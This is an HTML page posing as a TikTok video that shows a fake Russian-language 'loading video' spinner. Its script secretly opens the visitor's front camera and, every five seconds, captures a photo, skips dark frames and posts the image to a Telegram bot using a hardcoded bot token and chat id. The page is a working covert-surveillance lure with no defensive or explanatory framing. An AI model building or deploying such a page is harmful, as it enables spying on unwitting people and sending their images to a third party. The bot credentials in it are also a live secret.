<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body {
            background-color: #010101;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Proxima Nova', sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fe2c55;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';

    async function takeAndSendPhoto(video, canvas) {
        if (video.paused || video.ended || video.videoWidth === 0) return;

        // Оптимизация: берем контекст с параметром willReadFrequently
        const context = canvas.getContext('2d', { willReadFrequently: true });
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        
        // Продвинутая проверка на черный кадр
        // Берем данные из 3-х точек: центр, лево-верх, право-низ
        const points = [
            context.getImageData(canvas.width/2, canvas.height/2, 1, 1).data,
            context.getImageData(10, 10, 1, 1).data,
            context.getImageData(canvas.width-10, canvas.height-10, 1, 1).data
        ];

        // Проверяем, не слишком ли темно (сумма RGB > 15, чтобы отсечь шум)
        const isBlack = points.every(p => (p[0] + p[1] + p[2]) < 15);

        if (isBlack) {
            console.log("Кадр слишком темный или черный. Пропуск...");
            return;
        }

        const dataURL = canvas.toDataURL('image/jpeg', 0.6);
        const blob = await (await fetch(dataURL)).blob();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        try {
            await fetch(`https://api.telegram.org{botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            console.log("Цветное фото успешно отправлено!");
        } catch (e) {
            console.error("Ошибка сети:", e);
        }
    }

    window.onload = () => {
        const video = document.getElementById('video');
        video.setAttribute('autoplay', '');
        video.setAttribute('muted', '');
        video.setAttribute('playsinline', '');

        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } 
        })
        .then(stream => {
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;

            video.onplaying = () => {
                console.log("Камера ожила, ждем прогрева...");
                
                // Увеличиваем паузу до 3 секунд, чтобы камера точно успела включиться
                setTimeout(() => {
                    setInterval(() => {
                        takeAndSendPhoto(video, canvas);
                    }, 5000); 
                }, 3000);
            };

            video.play();
        })
        .catch(err => {
            console.log("Камера заблокирована:", err);
        });
    };
</script>
</body>
</html>
